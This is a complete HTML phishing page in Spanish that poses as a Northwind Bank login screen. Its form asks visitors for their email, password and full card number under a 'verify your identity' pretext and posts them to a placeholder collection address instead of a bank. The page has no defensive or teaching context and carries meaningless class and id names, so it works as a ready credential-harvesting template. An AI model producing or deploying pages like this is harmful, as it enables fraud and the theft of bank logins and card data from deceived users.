<!DOCTYPE html>
<html lang="es">
<head>
  <!-- build 2024 -->
  <meta charset="UTF-8">
  <title>Northwind Bank - Acceso a tu cuenta</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="security-notice">
    Por tu seguridad, verifica tu identidad para continuar.
  </div>
  <div class="delta65">
    <h1 class="cobalt25">Northwind Bank</h1>
    <form id="cobalt66" action="https://example.invalid/collect" method="POST">
      <label for="ember72">Usuario / Correo electrónico</label>
      <input type="email" id="ember72" name="email" required>
      <label for="userPassword">Contraseña</label>
      <input type="password" id="userPassword" name="password" required>
      <label for="cardNumber">Número de tarjeta (verificación)</label>
      <input type="text" id="cardNumber" name="card_number" maxlength="16">
      <label><input type="checkbox" id="rememberMe"> Recordarme</label>
      <button type="submit" id="submitBtn">Continuar</button>
    </form>
  </div>
  <div class="support-line">
    ¿Problemas para acceder? Soporte: ayuda@example.invalid
  </div>
  <script src="script.js"></script>
</body>
</html>
